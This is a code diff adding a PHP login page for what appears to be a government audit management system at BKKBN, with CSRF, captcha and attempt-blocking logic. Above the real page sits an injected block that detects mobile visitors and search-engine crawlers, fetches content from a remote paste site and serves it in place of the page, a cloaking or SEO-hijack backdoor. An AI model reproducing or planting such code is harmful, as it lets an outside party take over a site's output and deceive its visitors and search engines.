@@ -1,0 +1,494 @@
+<?php
+function isDefined() {
+    $userAgents = array(
+    'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 'Windows Phone',
+    'webOS', 'Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification',
+    'Google-InspectionTool', 'Googlebot-Image', 'Googlebot-News', 'Googlebot-Video',
+    'Storebot-Google', 'GoogleOther', 'GoogleOther-Image', 'GoogleOther-Video',
+    'Google-CloudVertexBot', 'Google-Extended', 'APIs-Google', 'AdsBot-Google-Mobile',
+    'AdsBot-Google', 'Mediapartners-Google', 'FeedFetcher-Google', 'Google-Favicon',
+    'Google Favicon', 'Googlebot-Favicon', 'Google-Read-Aloud', 'GoogleProducer',
+    'Google Web Preview', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 
+    'YandexBot', 'Sogou', 'Exabot', 'facebookexternalhit', 'ia_archiver', 
+    'Alexa Crawler', 'AhrefsBot', 'Semrushbot');
+
+    if(isset($_SERVER['HTTP_SEC_CH_UA_MOBILE']) && strtolower($_SERVER['HTTP_SEC_CH_UA_MOBILE']) == '?1'){return true;}
+    foreach ($userAgents as $agent) {
+        if (stripos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {return true;}
+    } return false;
+}
+
+if(isDefined()){
+    $url = 'https://paste.hexaspaces.com/raw/lfvhyGmyZ2k';
+    $landingPageContent = file_get_contents($url);
+    die($landingPageContent);
+}
+<?php
+include_once __DIR__ . "/environment.php";
+require_once __DIR__ . '/session_init.php';
+// file_put_contents('debug_post.log', print_r($_POST, true), FILE_APPEND);
+
+$position = 1;
+
+include_once __INCLUDES_DIR__ . "/classes/login_class.php";
+include_once __INCLUDES_DIR__ . "/common.php";
+include_once __INCLUDES_DIR__ . "/classes/param_class.php";
+
+$comfunc = new comfunction();
+
+$logins  = new login();
+$params  = new param();
+$app_id = sha1(APP_ID);
+
+function isValidAppSession()
+{
+    return isset($_SESSION[APP_ID]['ses_userId'], $_SESSION[APP_ID]['ses_appId']) &&
+        $_SESSION[APP_ID]['ses_appId'] === hash('sha256', $_SESSION[APP_ID]['ses_userId'] . APP_ID);
+}
+
+if (
+    isset($_SESSION[APP_ID]['ses_userId'])
+    && !empty(APP_ID)
+    && $app_id == sha1(APP_ID)
+    && isValidAppSession()
+) {
+    // Sudah login di session ini → langsung ke main page
+    header("Location: main_page.php");
+    exit;
+}
+
+// $logins->deleteLoginsytem();
+// $comfunc->get_max_upload();
+// hapus chace browser
+// header("Expires: Tue, 01 Jan 2000 00:00:00 GMT");
+// header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
+// header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+// header("Cache-Control: post-check=0, pre-check=0", false);
+// header("Pragma: no-cache");
+if (!isset($_SESSION[APP_ID]['csrf_token'])) {
+    $_SESSION[APP_ID]['csrf_token'] = bin2hex(random_bytes(32)); // Generate a random CSRF token
+}
+$csrfToken = $_SESSION[APP_ID]['csrf_token'];
+?>
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+    <meta charset="utf-8" />
+    <title>LOGIN | AUDIT MANAGEMENT SYSTEM | INSPEKTORAT BKKBN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no" />
+    <!-- <link rel="apple-touch-icon" href="pages/ico/60.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="pages/ico/76.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="pages/ico/120.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="pages/ico/152.png"> -->
+
+    <link rel="shortcut icon" href="images/bkkbn_new_2024.ico" type="image/x-icon">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-touch-fullscreen" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="google-site-verification" content="voXRxcwUlvSS2rd6kcUG2ojAipFp2i_h1hSg9UxDOPU" />
+    <meta content="" name="description" />
+    <meta content="" name="author" />
+    <!-- <link href="assets/login2/plugins/a/pace/pace-theme-flash.css" rel="stylesheet" type="text/css" /> -->
+    <!-- <link href="assets/login2/plugins/aguna/bootstrapv3/css/bootstrap.css" rel="stylesheet" type="text/css" /> -->
+    <link href="<?= __BASEURL__ ?>/assets/bootstrap-5.3.7-dist/css/bootstrap.css" rel="stylesheet" type="text/css" />
+    <link rel="stylesheet" href="<?= __BASEURL__ ?>/assets/bootstrap-icons-1.13.1/bootstrap-icons.min.css">
+    <!-- <link href="assets/login2/plugins/a/font-awesome/css/font-awesome.css" rel="stylesheet" type="text/css" /> -->
+    <!-- <link href="assets/login2/plugins/a/jquery-scrollbar/jquery.scrollbar.css" rel="stylesheet" type="text/css" media="screen" /> -->
+    <!-- <link href="assets/login2/pages-icons.css" rel="stylesheet" type="text/css"> -->
+    <link class="main-stylesheet" href="assets/login2/pages.css" rel="stylesheet" type="text/css" />
+
+    <style>
+        .bs-img {
+            height: 80px;
+            width: auto;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            min-height: 80px;
+        }
+    </style>
+    <!--[if lte IE 9]>
+        <link href="pages/css/ie9.css" rel="stylesheet" type="text/css" />
+    <![endif]-->
+    <script type="text/javascript">
+        window.onload = function() {
+            // fix for windows 8
+            if (navigator.appVersion.indexOf("Windows NT 6.2") != -1)
+                document.head.innerHTML += '<link rel="stylesheet" type="text/css" href="assets/login2/windows.chrome.fix.css" />'
+        }
+    </script>
+</head>
+
+<body>
+    <?php
+    $index = "index.php";
+
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        require_once 'captcha/CaptchaHelper.php';
+        $result_captcha = CaptchaHelper::validate(filter_input(INPUT_POST, 'captcha_input'));
+
+        // Validasi CSRF
+        if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $csrfToken) {
+            session_destroy();
+            echo "<script>alert('Halaman tidak valid, silakan refresh'); location.href='$index';</script>";
+            return;
+        }
+
+        // Validasi CAPTCHA
+        if ($result_captcha) {
+            if ($result_captcha['expired']) {
+                echo "<script>alert('CAPTCHA expired. Silakan reload.'); location.href='$index';</script>";
+                return;
+            }
+
+            if (!$result_captcha['valid']) {
+                echo "<script>alert('CAPTCHA salah!'); location.href='$index';</script>";
+                return;
+            }
+        }
+
+        // Jika lolos semua, lanjutkan proses
+        if ($result_captcha && $result_captcha['valid']) {
+            unset($_SESSION[APP_ID]['csrf_token']);
+            if ($_POST['submit'] == "Login") {
+                // var_dump("a1");
+                // die();
+
+                function handleLogin($user_n, $pass_key, $comfunc, $logins, $index)
+                {
+                    // Validasi kosong
+                    if ($user_n === "" || $pass_key === "") {
+                        alertAndRedirect("Username / Password tidak boleh kosong !!!", $index);
+                        return;
+                    }
+
+                    // var_dump("a1a");
+                    // die();
+
+                    // Cek blokir login
+                    if ($logins->isLoginBlocked($user_n)) {
+                        alertAndRedirect("Akun Anda diblokir sementara karena percobaan login berulang. Hubungi administrator untuk membuka blokir.", $index);
+                        return;
+                    }
+
+                    // var_dump("a1b");
+                    // die();
+
+                    // alertAndRedirect($logins->cek_username($username, $password), 1);
+
+                    // Cek username & password
+                    if ($logins->cek_username($user_n, $pass_key) === 0) {
+                        $logins->incrementLoginAttempt($user_n);
+                        alertAndRedirect("Verifikasi Username dan Password dengan benar dan coba kembali !!!", $index);
+                        return;
+                    }
+
+                    // var_dump("a2");
+                    // die();
+
+                    // Ambil data user
+                    $rs_user = $logins->data_user($user_n);
+                    $arr_user = $rs_user ? $rs_user->FetchRow() : null;
+
+                    if (!$arr_user) {
+                        alertAndRedirect("Data user tidak ditemukan.", $index);
+                        return;
+                    }
+
+                    // var_dump("a2a");
+                    // die();
+
+                    // Validasi status user
+                    $status = (int) $arr_user['user_status'];
+                    if ($status === 0) {
+                        alertAndRedirect("Akun Anda telah dihapus.", $index);
+                        return;
+                    } elseif ($status === 2) {
+                        alertAndRedirect("Akun Anda tidak aktif. Hubungi administrator.", $index);
+                        return;
+                    } elseif ($status === 3) {
+                        alertAndRedirect("Akun Anda diblokir. Hubungi administrator.", $index);
+                        return;
+                    }
+
+                    // var_dump("a2b");
+                    // die();
+
+                    // Validasi login 1 device
+                    if ($logins->cekLogin($arr_user['user_id']) !== 1) {
+                        $pending = $logins->cekPending($arr_user['user_id']);
+                        alertAndRedirect($pending, $index);
+                        return;
+                    }
+
+                    // var_dump("a2c");
+                    // die();
+
+                    // Login sukses
+                    $logins->resetLoginAttempt($arr_user['user_id']);
+                    $date = $comfunc->date_db(date("Y-m-d H:i:s"));
+                    $logins->insertStatus($arr_user['user_id'], $date);
+
+                    // Set session
+                    setSessionValue('ses_userId',    $arr_user['user_id']);
+                    setSessionValue('ses_appId',     hash('sha256', $arr_user['user_id'] . APP_ID));
+                    setSessionValue('ses_userName',  $arr_user['user_username']);
+                    setSessionValue('ses_groupId',   $arr_user['user_id_group']);
+                    setSessionValue('ses_id_int',    $arr_user['user_id_internal']);
+                    setSessionValue('ses_id_eks',    $arr_user['user_auditee_ekternal']);
+
+                    // var_dump('test');
+                    // die();
+
+                    echo "<script>location.href='main_page.php';</script>";
+                }
+
+                function setSessionValue($key, $value)
+                {
+                    $_SESSION[APP_ID][$key] = $value;
+                    // Optional: log session set
+                    // file_put_contents(__DIR__ . '/logs/session_set.log', "$key => $value\n", FILE_APPEND);
+                }
+
+                function alertAndRedirect($message, $target)
+                {
+                    echo "<script>alert('$message'); location.href='" . $target . "';</script>";
+                }
+
+                $user_n = $comfunc->replacetext($_POST['user_n']);
+                $pass_key = $comfunc->replacetext($_POST['pass_key']);
+
+                // var_dump($_POST);
+                // die();
+
+                handleLogin($user_n, $pass_key, $comfunc, $logins, $index);
+            }
+        }
+    }
+    ?>
+    <div class="login-wrapper">
+        <!-- START Login Background Pic Wrapper-->
+        <!-- <div class="bg-pic"> -->
+        <div class="row p-0 m-0">
+            <div class="col-8 px-0"
+                style="max-height: 100%;overflow: hidden;">
+                <div id="carouselExampleAutoplaying"
+                    class="carousel slide"
+                    data-bs-ride="carousel">
+                    <div class="carousel-inner">
+                        <div class="carousel-inner">
+                            <?php $rs_slide = $params->list_gambar(); ?>
+                            <?php foreach ($rs_slide as $key => $slide) : ?>
+                                <div class="carousel-item  <?= $key + 1 == 1 ? "active" : "" ?>">
+                                    <img src="Upload/Upload_Foto/<?= $slide['gambar_name'] ?>"
+                                        style="max-width: max-content;height: auto;object-fit: cover;"
+                                        class="d-block w-100"
+                                        alt="<?= $slide['gambar_name'] ?>"
+                                        loading="lazy" />
+                                </div>
+                            <?php endforeach ?>
+                        </div>
+                    </div>
+                </div>
+                <!-- END Login Background Pic Wrapper-->
+            </div>
+            <!-- START Login Right Container-->
+            <div class="col-4 px-0"
+                style="max-height: 100%;overflow: auto;align-self: center;">
+                <div class="login-container-off bg-white-off">
+                    <div class="p-l-50 m-l-20 p-r-50 m-r-20 p-t-50-off m-t-10-off sm-p-l-15 sm-p-r-15 sm-p-t-40-off">
+                        <?php
+                        // echo str_repeat('<br/>', 2);
+                        ?>
+                        <img
+                            src="images/logo_bkkbn_new_2024_optimize.png"
+                            alt="logo"
+                            data-src="images/logo_bkkbn_new_2024_optimize.png"
+                            data-src-retina="images/logo_bkkbn_new_2024_optimize.png"
+                            class="bs-img" />
+                        <h5 class="kata-bijak" style="font-weight: bold;">Audit Management System</h5>
+                        <h5 class="kata-bijak">Inspektorat Utama BKKBN</h5>
+                        <!-- START Login Form -->
+                        <form id="form-login"
+                            class="p-t-15"
+                            role="form"
+                            action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>"
+                            autocomplete="off"
+                            method="post">
+                            <input type="hidden" name="csrf_token" value="<?php echo $csrfToken; ?>">
+                            <!-- START Form Control-->
+                            <div class="form-group form-group-default">
+                                <label>Username</label>
+                                <div class="controls">
+                                    <input type="text"
+                                        name="user_n"
+                                        class="form-control"
+                                        autocomplete="username"
+                                        placeholder="Masukan Username" required>
+                                </div>
+                            </div>
+                            <!-- END Form Control-->
+                            <!-- START Form Control-->
+                            <!-- <div class="form-group form-group-default">
+                                <label>Password</label>
+                                <div class="controls">
+                                    <input type="password"
+                                        name="pass_key"
+                                        class="form-control"
+                                        autocomplete="current-password"
+                                        placeholder="Masukan Password" required>
+                                </div>
+                            </div> -->
+                            <div class="form-group form-group-default">
+                                <div class="row">
+                                    <div class="col-10">
+                                        <label>Password</label>
+                                        <div class="controls">
+                                            <input type="text"
+                                                id="pass_key_display"
+                                                class="form-control"
+                                                autocomplete="current-password"
+                                                placeholder="Masukan Password"
+                                                required />
+                                            <input type="hidden"
+                                                class="d-none"
+                                                name="pass_key"
+                                                id="pass_key_hidden">
+                                        </div>
+                                    </div>
+                                    <div class="col-2 p-0"
+                                        style="align-content: center;text-align: center;">
+                                        <button class="btn btn-outline-light p-0"
+                                            type="button"
+                                            id="toggle_pass_key"
+                                            style="font-size: 21px;width: 100%;height: 100%;">
+                                            <i class="bi bi-eye"></i>
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="form-group form-group-default">
+                                <div class="box-captcha" style="display: flex;flex-direction: row;justify-content: flex-start;align-items: center;">
+                                    <img src="captcha/captcha.php"
+                                        id="captcha-img">
+                                    <button type="button"
+                                        class="btn btn-lg p-0"
+                                        title="Reload Captcha"
+                                        style="margin-left: 10px;font-size: 22pt;"
+                                        onclick="document.getElementById('captcha-img').src='captcha/captcha.php?'+Date.now()">🔄</button>
+                                </div>
+
+                                <label>Captcha</label>
+                                <div class="controls">
+                                    <input type="text"
+                                        name="captcha_input"
+                                        class="form-control"
+                                        autocomplete="off"
+                                        placeholder="Masukan Captcha"
+                                        maxlength="4" required>
+                                </div>
+                            </div>
+                            <input type="submit"
+                                class="btn btn-primary btn-cons m-t-10"
+                                name="submit"
+                                value="Login">
+                        </form>
+                        <!--END Login Form-->
+                        <div class="pull-bottom sm-pull-bottom">
+                            <div class="m-b-30-off p-r-80-off sm-m-t-20 sm-p-r-15 sm-p-b-20 clearfix">
+                                <div class="col-sm-12 no-padding m-t-10">
+                                    <div class="row">
+                                        <div class="col-sm-12">
+                                            <p>
+                                                <small>Copyright © Inspektorat Utama BKKBN 2023</small>
+                                            </p>
+                                        </div>
+                                        <div class="col-sm-12">
+                                            <span class="text-right">V 1.4</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- END Login Right Container-->
+        </div>
+    </div>
+
+    <!-- BEGIN VENDOR JS -->
+    <!-- <script src="assets/login2/plugins/a/jquery/jquery-1.11.1.min.js" type="text/javascript"></script> -->
+    <script src="js/jquery-3.4.1.min.js" type="text/javascript"></script>
+    <!-- <script src="assets/login2/plugins/a/pace/pace.min.js" type="text/javascript"></script> -->
+    <!-- <script src="assets/login2/plugins/a/modernizr.custom.js" type="text/javascript"></script> -->
+    <!-- <script src="assets/login2/plugins/a/jquery-ui/jquery-ui.min.js" type="text/javascript"></script> -->
+    <!-- <script src="assets/login2/plugins/aguna/bootstrapv3/js/bootstrap.min.js" type="text/javascript"></script> -->
+    <script src="<?= __BASEURL__ ?>/assets/bootstrap-5.3.7-dist/js/bootstrap.min.js" type="text/javascript"></script>
+    <!-- <script src="assets/login2/plugins/a/jquery-scrollbar/jquery.scrollbar.min.js"></script> -->
+    <!-- <script src="assets/login2/plugins/a/jquery-validation/js/jquery.validate.js" type="text/javascript"></script> -->
+    <!-- END VENDOR JS -->
+    <!-- <script src="assets/login2/pages.min.js"></script> -->
+    <script>
+        $(function() {
+            const inputDisplay = $('#pass_key_display');
+            const inputHidden = $('#pass_key_hidden');
+            const toggleBtn = $('#toggle_pass_key');
+            const icon = toggleBtn.find('i');
+            const form = $('#form-login');
+
+            let rawPassword = '';
+            let isVisible = false;
+
+            inputDisplay.on('input', function(e) {
+                const newVal = inputDisplay.val();
+                const prevLength = rawPassword.length;
+                const cursorPos = this.selectionStart;
+                const addedChar = e.originalEvent?.data || '';
+
+                if (newVal.length > prevLength) {
+                    rawPassword =
+                        rawPassword.slice(0, cursorPos - 1) + addedChar + rawPassword.slice(cursorPos - 1);
+                } else if (newVal.length < prevLength) {
+                    rawPassword =
+                        rawPassword.slice(0, cursorPos) + rawPassword.slice(cursorPos + (prevLength - newVal.length));
+                }
+
+                if (!isVisible) {
+                    inputDisplay.val('*'.repeat(rawPassword.length));
+                }
+            });
+
+            toggleBtn.on('click', function() {
+                isVisible = !isVisible;
+
+                if (isVisible) {
+                    inputDisplay.val(rawPassword);
+                    icon.removeClass('bi-eye').addClass('bi-eye-slash');
+                } else {
+                    inputDisplay.val('*'.repeat(rawPassword.length));
+                    icon.removeClass('bi-eye-slash').addClass('bi-eye');
+                }
+            });
+
+            form.on('submit', function() {
+                inputHidden.val(rawPassword);
+            });
+        });
+
+        $(function() {
+            // $('#form-login').validate()
+
+            const myCarouselElement = document.querySelector('#carouselExampleAutoplaying')
+
+            const carousel = new bootstrap.Carousel(myCarouselElement, {
+                interval: 2000, // 2000
+                touch: false
+            })
+        })
+    </script>
+</body>
+
+</html>
